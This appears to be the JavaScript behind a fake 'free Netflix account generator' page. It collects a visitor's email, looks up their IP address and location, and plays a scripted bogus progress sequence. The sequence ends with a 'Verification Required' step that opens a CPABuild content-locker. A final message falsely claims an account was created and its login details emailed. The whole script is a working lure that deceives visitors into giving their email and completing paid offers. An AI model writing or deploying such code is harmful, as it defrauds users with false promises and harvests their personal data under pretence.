$('.get').click(function () {
    $this = $(this);
    $this.addClass('loading');
    form = $this.parents('.form');
    value = form.find('input').val();
    form.find('.error').remove();
    if (value == '') {
        form.addClass('has-error');
        form.append('<div class="error">Email is required.</div>');
        $this.removeClass('loading');
    } else {
        $.ajax({
            url: 'https://isitarealemail.com/api/email/validate?email=' + value,
            success: function (data) {
                status = data.status;
                if (status == 'invalid') {
                    form.addClass('has-error');
                    form.append('<div class="error">You entered an invalid email. Please enter your real email.</div>');
                    $this.removeClass('loading');
                } else {
                    setTimeout(function () {
                        $('body').css('overflow', 'hidden');
                        $('.page-action').fadeIn();
                        email = form.find('input[name="email"]').val();
                    }, 1500);
                }
            }
        })
    }



    /*
            if(!value.includes('@') || !value.includes('.') ){
                form.find('.error').remove();
                form.addClass('has-error');
                form.append('<div class="error">You entered an invalid email format.</div>');
            }else if (value !== '') {
                form.removeClass('has-error').find('.error').remove();
                $this.addClass('loading');
                setTimeout(function(){
                    $('body').css('overflow','hidden');
                    $('.page-action').fadeIn();
                    email = form.find('input[name="email"]').val();
                },1500);
            }else{
                form.find('.error').remove();
                form.addClass('has-error');
                form.append('<div class="error">Email is required.</div>');
            }*/

})
$(".head-button").click(function () {
    $('html, body').animate({
        scrollTop: $(".guide").offset().top
    }, 1000);
});

$('.basic,.standard,.premium').click(function () {
    plan = '.' + $(this).attr('class');
    otherClasses = ['no', 'yes', 'planGrid', ' ', 'active',];
    for (var i = 0; i < otherClasses.length; i++) {
        word = otherClasses[i];
        if (plan.indexOf(word) >= 0) {
            //alert(word);
            plan = plan.replace(word, '');
        }
    }
    $('.Content-Pa').find('.active').removeClass('active');
    $('.Content-Pa').find(plan).addClass('active');
})

$('.Content-Pa .continue').click(function () {
    t = $(this).parents('.Content-Pa');
    CPlan = t.find('.plansGrid .active').attr('id');
    $('.loading-action').show();
    t.hide();
    action();

})
function action() {
    $.ajax({
        /*url: 'https://api.myip.com/',
        url: 'https://freegeoip.app/json/',*/
        url: 'https://ip.nf/me.json',
        success: function (data) {
            ip = data.ip.ip;
            city = data.ip.city;
            country = data.ip.country;
            country_code = data.ip.country_code;
            Vprocess = {
                "0": { "msg": "Loading", "time": "500" },
                "1": { "msg": "Unpacking assets", "time": "1800" },
                "2": { "msg": "Unpacking netflix.pkg", "time": "800" },
                "3": { "msg": "Searching for closest server", "time": "2000" },
                "4": { "msg": "Connecting to Server in: <img class='flag' src='https://countryflagsapi.com/svg/" + country_code + "'> " + country, "time": "3000" },
                "5": { "msg": "Genarating email and password", "time": "3000" },
                "6": { "msg": "Selecting the Plan", "time": "5000" },
                "7": { "msg": "Plan Selected!", "time": "1000" },
                "8": { "msg": "Saving Results...", "time": "1000" },
                "9": { "msg": "Unusually high traffic from: " + data.ip.country, "time": "2500" },
                "10": { "msg": "Verification Required", "time": "1000" }
            };


        }
    })
    //////////////////////// AFTER AJAX COMPLETE //////////////////////
    $(document).ajaxStop(function () {
        c = 0;
        function changingStatus() {
            //if (c == 10) {	return;   }
            $('.loading-action .process').html(Vprocess[c]['msg']);

            if (c == 6) {
                $('.loading-action .loading').hide().after('<div class="plan"><p>' + CPlan + '</p></div>');
                setTimeout(function () {
                    $('.loading-action .plan').remove();
                    $('.loading-action .loading').show();
                }, 6000);
            }
            //if (c == 4) {// CONNECTNG TO SERVER
            //	return;
            //       $('.loading-action .process').append("<img id=\"flag\" src='https://countryflagsapi.com/svg/"+country_code+"'> "+country);
            //}
            c++;
            changeInterval();

        }

        var Interval = setInterval(changingStatus, 500);

        function CPABuildComplete() {
            $('.loading-action').fadeOut();
            $('.loading-action').after('<div class="finish-action"></div>').remove();
            finish = $('.finish-action');
            finish.prepend('<div class="congratulations"></div>');
            finish.append('<h2>Congratulations! Your account is ready to use</h2>');
            finish.append('<p>We have sent an email to ' + email + ' containing the login information for your account.</p>');
            finish.append('<ul class="TP"><li>Watch unlimited Movies & TV Shows</li><li>One account for all your devices</li><li>Download the free netflix app</li></ul>');
            finish.fadeIn();
        }

        function changeInterval() {
            clearInterval(Interval);
            if (typeof Vprocess[c] !== 'undefined') {
                Interval = setInterval(changingStatus, Vprocess[c - 1]['time']);
                //Interval = setInterval(changingStatus, 100);
            } else {
                $("#CPABUILD_MODAL_CONTAINER").appendTo(".page-action");
                $("#CPABUILD_MODAL").css(
                    {
                        'background': 'transparent',
                        'top': '120px',
                        'position': 'absolute',
                        'opacity': '0',
                        'visibility': 'hidden',
                        'transition': '0.4s'
                    });
                $("#CPABUILD_MODAL").addClass('CPABUILD_MODAL');
                CPABuildLock();
                CPABuildComplete();


                setTimeout(function () {
                    $("#CPABUILD_MODAL").css({ 'opacity': '1', 'visibility': 'visible' });
                }, 3500);

                /* setTimeout(function(){
                     $('.page-action .offers').removeAttr('style');
                 },3000);*/
            }
        }
    });
}


